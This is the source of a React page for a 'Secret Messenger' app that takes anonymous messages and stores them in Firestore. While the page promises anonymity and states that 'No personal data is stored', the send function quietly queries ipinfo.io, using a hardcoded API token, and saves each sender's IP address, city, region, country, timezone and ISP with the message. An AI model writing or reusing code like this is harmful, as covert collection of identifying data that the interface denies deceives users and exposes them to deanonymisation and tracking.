"use client";

import { useState } from 'react';
import { db } from '../firebase/config';
import { collection, addDoc, serverTimestamp } from 'firebase/firestore';
import { Typewriter } from 'react-simple-typewriter';

// This function gets the user's IP address and location info
async function getIPAddress() {
  try {
    
    const response = await fetch(
      "https://ipinfo.io/json?token=64006e093bf4e1"
    );
    const data = await response.json();
    return {
      ip: data.ip,
      city: data.city,
      region: data.region,
      country: data.country,
      timezone: data.timezone,
      org: data.org,
    };
  } catch (error) {
    console.error("Error fetching IP:", error);
    // Return default values if the fetch fails
    return {
      ip: "Unknown",
      city: "Unknown",
      region: "Unknown",
      country: "Unknown",
      timezone: "Unknown",
      org: "Unknown",
    };
  }
}

export default function Home() {
  const [message, setMessage] = useState('');
  const [status, setStatus] = useState('');
  const [isLoading, setIsLoading] = useState(false);

  const sendMessage = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!message.trim()) return;
    setIsLoading(true); // Set loading to true
    
    
    try {
      // Get IP address data before sending the message
      const ipData = await getIPAddress();

      const messagesRef = collection(db, "messages");
      await addDoc(messagesRef, {
        text: message,
        timestamp: serverTimestamp(),
        ...ipData, // Add all the IP data to the Firestore document
      });

      setMessage('');
      setStatus('✓ Message sent successfully!');
      setTimeout(() => setStatus(''), 4000);
    } catch (error) {
      console.error("Error sending message:", error);
      setStatus('Error: Could not send message.');
      setTimeout(() => setStatus(''), 4000);
    }
    finally{

      setIsLoading(false);
    }


  };

  return (
    <>
      




      <header>
  <h1>Secret Messenger</h1>
  <div className="subtitle">
    <Typewriter
      // All phrases are combined into one string
      words={['Send anonymous messages. Share your thoughts freely. Your secrets are safe here.']}
      // Set loop to false to make it stop at the end
      cursor
      cursorStyle=''
      typeSpeed={60}
      delaySpeed={1000}
    />
  </div>
</header>

      <main>
        <div className="card">
 
          <form id="messageForm" onSubmit={sendMessage}>
            <div className="form-group">
              <label htmlFor="message">Your Message</label>
              <textarea
                id="message"
                value={message}
                onChange={(e) => setMessage(e.target.value)}
                placeholder="Write Secret Message..."
                required
              ></textarea>
            </div>
            <button type="submit" className="btn" disabled={isLoading}>
              {isLoading ? 'Sending...' : 'Send Message'}
            </button>
            {status && <p style={{ textAlign: 'center', marginTop: '1rem', color: 'var(--secondary)' }}>{status}</p>}
          </form>
        </div>

        <div className="card terms-card">
          <h3 style={{ color: 'var(--secondary)', marginBottom: '1rem', textShadow: 'var(--text-glow)' }}>
            Terms of Use
          </h3>
          <div className="terms-content">
            <p><strong>Please be respectful and responsible:</strong></p>
            <ul>
              <li>❌ No spam, harassment, or inappropriate messages</li>
              <li>❌ No personal information or doxxing</li>
              <li>❌ No threats, hate speech, or bullying</li>
            </ul>
            <p className="terms-note">
              All messages are anonymous. No personal data is stored.
            </p>
          </div>
        </div>
      </main>

      <footer>
        <p>Hey stalker 👀... you could’ve just sent a message, y'know?</p>
        
         
        
  <p style={{ fontSize: '0.8rem', color: '#555' }}>
    © 2025 Secret Messenger | Developed by Muxain  
  </p>


      </footer>
    </>
  );
}